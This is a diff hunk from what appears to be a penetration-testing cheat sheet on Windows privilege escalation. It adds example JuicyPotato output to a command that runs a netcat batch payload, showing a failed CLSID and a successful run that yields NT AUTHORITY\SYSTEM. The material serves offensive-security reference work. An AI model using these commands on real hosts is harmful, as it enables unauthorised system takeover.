@@ -935,6 +935,16 @@ JuicyPotato - All older versions of Windows
 # edit nc.bat with correct params and transfer to remote host
 cmd> whoami /privs
 cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
+
+# Exploit failed - incorrect CLSID
+Testing {4991D34B-80A1-4291-B697-000000000000} 443
+COM -> recv failed with error: 10038
+
+# Exploit worked - correct CLSID
+Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 443
+[+] authresult 0
+{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
+[+] CreateProcessWithTokenW OK
 ```
 
 PrintSpoofer - Windows 10 and Server 2016/2019
